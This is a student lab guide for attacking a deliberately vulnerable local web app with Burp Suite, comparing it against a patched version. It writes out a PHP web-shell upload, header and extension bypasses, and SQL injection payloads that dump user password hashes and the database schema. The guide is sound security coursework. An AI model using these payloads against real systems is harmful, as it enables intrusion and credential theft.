# Step 2: Burp Suite Testing

**Time Required:** 4-5 hours  
**Who:** All 3 team members (Person 1 leads, others observe and document)  
**Goal:** Test all 4 vulnerabilities using Burp Suite and capture evidence

## Overview

We will test:
1. Upload Scenario 1: No Protection
2. Upload Scenario 2: Weak Protection (size + extension bypass)
3. Upload Scenario 3: Encrypted File Bypass
4. SQL Injection (role-based)

For each test, we'll:
- Intercept the request
- Modify if needed
- Capture screenshot
- Test on vulnerable version (should succeed)
- Test on patched version (should fail)
- Check monitoring dashboard

## Pre-Test Setup

### 1. Start Burp Suite

```bash
open -a "Burp Suite Community Edition"
```

Wait for it to load, then:
- Select "Temporary project" → Next
- "Use Burp defaults" → Start Burp

### 2. Configure Burp

**Proxy tab:**
- Intercept → Turn OFF (for now)
- HTTP history → Clear

**Options:**
- Go to Proxy → Options
- Verify "127.0.0.1:8080" is in Proxy Listeners
- Should see "Running"

### 3. Open Firefox with Proxy

**Verify proxy settings:**
- Firefox → Settings → Network Settings
- Should be "Manual proxy" to 127.0.0.1:8080

### 4. Prepare Screenshot Tool

**macOS:**
- ⌘+Shift+4 for selection screenshot
- Screenshots save to Desktop by default

**Or use:**
```bash
open -a "Screenshot.app"
```

## Test 1: Upload Scenario 1 (No Protection)

**Vulnerability:** No file validation whatsoever  
**Expected:** Should upload any file type  
**File:** vulnerable/app/routes/upload.py (scenario1)

### A. Test on Vulnerable Version (Should Succeed)

**Step 1: Navigate to Upload Page**
1. Open Firefox
2. Go to http://localhost:5002
3. Login as admin/admin123
4. Click "Upload" in menu
5. Click "Scenario 1: Firmware Upload"

**Step 2: Prepare Burp**
1. In Burp, go to Proxy → Intercept
2. Turn Intercept **ON** (button should say "Intercept is on")

**Step 3: Upload Malicious File**
1. In Firefox, click "Choose File"
2. Select: testing_results/test_files/malicious.php
3. Click "Upload Firmware"
4. Request will be intercepted in Burp

**Step 4: Examine Request in Burp**

You should see something like:
```http
POST /upload/scenario1 HTTP/1.1
Host: localhost:5002
Cookie: session=...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="file"; filename="malicious.php"
Content-Type: application/x-php

<?php system($_GET["cmd"]); ?>
------WebKitFormBoundary...
```

**SCREENSHOT 1:** Capture Burp window showing this request  
**Filename:** `01_burp_scenario1_vulnerable_request.png`

**Step 5: Forward Request**
1. Click "Forward" in Burp
2. Turn Intercept OFF
3. Check Firefox - should see success message

**SCREENSHOT 2:** Capture success message  
**Filename:** `02_burp_scenario1_vulnerable_success.png`

**Step 6: Verify File Uploaded**
```bash
ls -la /Users/azuolasbalbieris/Documents/Academic/Cybersecurity/task_5_CS437/vulnerable/uploads/firmware/
```

You should see: `malicious.php`

**SCREENSHOT 3:** Terminal showing file  
**Filename:** `03_burp_scenario1_file_on_disk.png`

**Step 7: Check Monitoring Dashboard**
1. Go to http://localhost:5002/monitoring
2. Should see new entry for file upload
3. Check details: attack_type, filename, user

**SCREENSHOT 4:** Monitoring dashboard  
**Filename:** `04_burp_scenario1_monitoring.png`

### B. Test on Patched Version (Should Fail)

**Step 1: Switch to Patched App**
1. Open new tab: http://localhost:5001
2. Login as admin/admin123
3. Go to Upload → Scenario 1

**Step 2: Attempt Same Upload**
1. Turn Burp Intercept ON
2. Upload malicious.php
3. Examine request (should look similar)

**SCREENSHOT 5:** Burp request to patched version  
**Filename:** `05_burp_scenario1_patched_request.png`

**Step 3: Forward and Observe**
1. Forward request
2. Turn Intercept OFF
3. Should see error: "Invalid file type. Only .bin and .conf allowed"

**SCREENSHOT 6:** Error message  
**Filename:** `06_burp_scenario1_patched_blocked.png`

**Step 4: Check Monitoring**
1. Go to http://localhost:5001/monitoring
2. Should see blocked attempt logged

**SCREENSHOT 7:** Monitoring showing block  
**Filename:** `07_burp_scenario1_patched_monitoring.png`

## Test 2: Upload Scenario 2 (Weak Protection - Size Bypass)

**Vulnerability:** Size checked via Content-Length header (client-controlled)  
**Expected:** Can bypass by manipulating header

### A. Size Bypass on Vulnerable Version

**Step 1: Create Large File**
```bash
dd if=/dev/zero of=testing_results/test_files/oversized.bin bs=1m count=10
ls -lh testing_results/test_files/oversized.bin
```
Should show 10 MB file.

**Step 2: Upload Large File**
1. Go to http://localhost:5002/upload/scenario2
2. Turn Burp Intercept ON
3. Upload oversized.bin
4. Intercept in Burp

**Step 3: Modify Content-Length Header**

Original request will show:
```http
Content-Length: 10485760
```

Change it to:
```http
Content-Length: 1024
```

**SCREENSHOT 8:** Burp showing modified Content-Length  
**Filename:** `08_burp_scenario2_size_bypass_request.png`

**Step 4: Forward Request**
1. Click Forward
2. Turn Intercept OFF
3. Should succeed despite being oversized

**SCREENSHOT 9:** Success message  
**Filename:** `09_burp_scenario2_size_bypass_success.png`

**Step 5: Check Monitoring**
**SCREENSHOT 10:** Monitoring log showing size_bypass  
**Filename:** `10_burp_scenario2_size_bypass_monitoring.png`

### B. Extension Bypass on Vulnerable Version

**Vulnerability:** Blacklist only blocks .exe, .sh, .bat, .php  
**Expected:** .jsp, .py, .rb files will work

**Step 1: Upload JSP File**
1. Go to http://localhost:5002/upload/scenario2
2. Turn Burp Intercept ON
3. Upload malicious.jsp
4. Intercept in Burp

**Step 2: Examine Request**
```http
Content-Disposition: form-data; name="file"; filename="malicious.jsp"
Content-Type: application/octet-stream
```

**SCREENSHOT 11:** Burp showing JSP upload  
**Filename:** `11_burp_scenario2_extension_bypass_request.png`

**Step 3: Forward**
- Should succeed (JSP not in blacklist)

**SCREENSHOT 12:** Success message  
**Filename:** `12_burp_scenario2_extension_bypass_success.png`

### C. Test on Patched Version

**Step 1: Try Same Uploads on Patched**
1. Go to http://localhost:5001/upload/scenario2
2. Try uploading oversized.bin (should fail - real size check)
3. Try uploading malicious.jsp (should fail - whitelist only)

**SCREENSHOT 13:** Patched rejecting uploads  
**Filename:** `13_burp_scenario2_patched_blocked.png`

## Test 3: Upload Scenario 3 (Encrypted Bypass)

**Vulnerability:** Files encrypted before scan, decrypted without re-scan  
**Expected:** Malicious content hidden in encryption

### A. Upload and Decrypt on Vulnerable

**Step 1: Upload Malicious File**
1. Go to http://localhost:5002/upload/scenario3
2. Upload malicious.php
3. Intercept in Burp (turn ON)

**Step 2: Examine Request**
```http
POST /upload/scenario3 HTTP/1.1
...
filename="malicious.php"
```

**SCREENSHOT 14:** Burp showing upload  
**Filename:** `14_burp_scenario3_upload_request.png`

**Step 3: Forward and Note File ID**
1. Forward request
2. Success message will show file ID (e.g., "File uploaded with ID: 1")
3. Note this ID

**SCREENSHOT 15:** Success with file ID  
**Filename:** `15_burp_scenario3_upload_success.png`

**Step 4: Check Encrypted File**
```bash
ls -la /Users/azuolasbalbieris/Documents/Academic/Cybersecurity/task_5_CS437/vulnerable/uploads/encrypted/
```

Should see: `[hash].enc`

**Step 5: Trigger Decryption**
1. Turn Burp Intercept ON
2. In Firefox, manually visit:
```
http://localhost:5002/upload/scenario3/decrypt/1
```
(Replace 1 with your file ID)

**Step 6: Intercept Decrypt Request**

Should see:
```http
GET /upload/scenario3/decrypt/1 HTTP/1.1
Host: localhost:5002
Cookie: session=...
```

**SCREENSHOT 16:** Burp showing decrypt request  
**Filename:** `16_burp_scenario3_decrypt_request.png`

**Step 7: Forward and Check**
1. Forward request
2. Should see success message
3. Check decrypted file:

```bash
ls -la /Users/azuolasbalbieris/Documents/Academic/Cybersecurity/task_5_CS437/vulnerable/uploads/firmware/
```

Should see: `decrypted_malicious.php`

**SCREENSHOT 17:** Decrypted file on disk  
**Filename:** `17_burp_scenario3_decrypted_file.png`

**Step 8: Check Monitoring**
**SCREENSHOT 18:** Monitoring showing encrypted upload  
**Filename:** `18_burp_scenario3_monitoring.png`

### B. Test on Patched Version

**Patched behavior:** Decrypts THEN scans (scan on plaintext)

1. Go to http://localhost:5001/upload/scenario3
2. Upload malicious.php
3. Try to decrypt (should fail - file blocked after decryption)

**SCREENSHOT 19:** Patched blocking malicious after decrypt  
**Filename:** `19_burp_scenario3_patched_blocked.png`

## Test 4: SQL Injection (Role-Based)

**Vulnerability:** Admin queries use raw SQL, operator uses parameterized  
**Expected:** Injection works as admin, fails as operator

### A. Test as Operator (Should Be Safe)

**Step 1: Login as Operator**
1. Logout from admin
2. Login as operator1/operator123

**Step 2: Go to Valve Search**
1. Click "Valves" in menu
2. See search box at top

**Step 3: Test Normal Search**
1. Turn Burp Intercept ON
2. Type "pump" in search
3. Click Search
4. Intercept in Burp

**Step 4: Examine Normal Request**
```http
POST /valves/search HTTP/1.1
Host: localhost:5002
Cookie: session=...

search=pump
```

**SCREENSHOT 20:** Normal search request  
**Filename:** `20_burp_sqli_normal_request.png`

**Step 5: Inject SQL Payload**

In Burp, change:
```
search=pump
```

To:
```
search=' UNION SELECT id,username,password_hash,role,email,created_at,last_login,NULL FROM users--
```

**SCREENSHOT 21:** Burp with SQL injection payload (operator)  
**Filename:** `21_burp_sqli_operator_injection.png`

**Step 6: Forward**
1. Forward request
2. Turn Intercept OFF
3. Check result - should NOT show user data (parameterized query)

**SCREENSHOT 22:** Operator injection failed (safe)  
**Filename:** `22_burp_sqli_operator_safe.png`

### B. Test as Admin (Should Be Vulnerable)

**Step 1: Logout and Login as Admin**
1. Logout
2. Login as admin/admin123

**Step 2: Go to Valve Search**
1. Click "Valves"
2. Search box

**Step 3: Inject Same Payload**
1. Turn Burp Intercept ON
2. Search for anything
3. In Burp, change search parameter to:
```
search=' UNION SELECT id,username,password_hash,role,email,created_at,last_login,NULL FROM users--
```

**SCREENSHOT 23:** Burp with SQL injection (admin)  
**Filename:** `23_burp_sqli_admin_injection_request.png`

**Step 4: Forward and Observe**
1. Forward request
2. Turn Intercept OFF
3. Page should show USER DATA instead of valves!

You should see user records with:
- Usernames (admin, operator1, operator2, etc.)
- Password hashes
- Email addresses
- Roles

**SCREENSHOT 24:** Successful SQL injection showing user data  
**Filename:** `24_burp_sqli_admin_injection_success.png`

**Step 5: Try Another Payload - Database Schema**

Repeat with:
```
search=' UNION SELECT 1,name,sql,type,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--
```

**SCREENSHOT 25:** Database schema extraction  
**Filename:** `25_burp_sqli_schema_extraction.png`

**Step 6: Check Monitoring**
1. Go to /monitoring
2. Should see sql_injection attacks logged

**SCREENSHOT 26:** Monitoring showing SQL injection attempts  
**Filename:** `26_burp_sqli_monitoring.png`

### C. Test on Patched Version as Admin

**Step 1: Switch to Patched**
1. Open http://localhost:5001
2. Login as admin/admin123

**Step 2: Attempt Injection**
1. Go to Valves → Search
2. Turn Burp Intercept ON
3. Try same UNION payload

**SCREENSHOT 27:** Injection attempt on patched  
**Filename:** `27_burp_sqli_patched_attempt.png`

**Step 3: Observe Block**
- Should show normal search results (no injection)
- Or show error message
- Monitoring logs it as blocked

**SCREENSHOT 28:** Patched blocking injection  
**Filename:** `28_burp_sqli_patched_blocked.png`

## Organizing Burp Results

### 1. Save HTTP History

In Burp:
1. Go to Proxy → HTTP history
2. Select all requests related to testing
3. Right-click → Save items
4. Save as: `testing_results/burp_captures/http_history.xml`

### 2. Export Specific Requests

For each important request:
1. Right-click request in HTTP history
2. Copy to file
3. Save as: `testing_results/burp_captures/scenario1_request.txt`

Create files for:
- scenario1_request.txt
- scenario2_size_bypass.txt
- scenario2_extension_bypass.txt
- scenario3_upload.txt
- scenario3_decrypt.txt
- sqli_operator.txt
- sqli_admin_union.txt
- sqli_admin_schema.txt

### 3. Move Screenshots

```bash
cd ~/Desktop
mkdir -p /Users/azuolasbalbieris/Documents/Academic/Cybersecurity/task_5_CS437/testing_results/screenshots/burp/
mv *burp*.png /Users/azuolasbalbieris/Documents/Academic/Cybersecurity/task_5_CS437/testing_results/screenshots/burp/
```

## Summary Checklist

After completing all Burp Suite tests, verify you have:

**Screenshots (28 total):**
- [ ] 7 for Scenario 1 (vulnerable + patched)
- [ ] 6 for Scenario 2 (size + extension bypasses)
- [ ] 6 for Scenario 3 (encrypted bypass)
- [ ] 9 for SQL Injection (operator + admin + patched)

**Burp Captures:**
- [ ] HTTP history XML file
- [ ] 8+ individual request text files

**Verification:**
- [ ] All uploads worked on vulnerable version
- [ ] All uploads blocked on patched version
- [ ] SQL injection worked as admin
- [ ] SQL injection failed as operator
- [ ] SQL injection failed on patched
- [ ] Monitoring logged all attacks

## Troubleshooting

**"Cannot intercept requests":**
- Check Firefox proxy settings
- Restart Burp Suite
- Make sure Intercept is ON

**"Certificate error in browser":**
- Re-import Burp certificate
- Try using http:// instead of https://

**"Request not showing in Burp":**
- Check HTTP history tab
- Verify proxy listener is running
- Restart Firefox

**"SQL injection not showing data":**
- Verify logged in as ADMIN (not operator)
- Check payload formatting (no typos)
- Try simpler payload first: `' OR 1=1--`

**"File upload succeeds but file not found":**
- Check file permissions
- Look in correct upload folder:
  - Scenario 1: uploads/firmware/
  - Scenario 2: uploads/configs/
  - Scenario 3: uploads/encrypted/ then uploads/firmware/

## Next Steps

**Once all Burp Suite tests complete:**
→ **03_SQLMAP_TESTING.md**

**Estimated time for next step:** 3-4 hours
